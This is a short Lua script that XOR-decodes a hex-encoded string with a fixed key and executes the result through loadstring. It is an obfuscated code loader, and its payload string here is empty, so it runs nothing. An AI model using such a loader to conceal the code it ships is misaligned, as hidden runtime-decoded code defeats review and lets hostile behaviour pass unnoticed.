local k={189,87,120,154,132,64,46,167,27,184,21,5,19,207,60,202,7,139,195,246,48,7,142,61,235,52,33,215,188,204,110,252}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
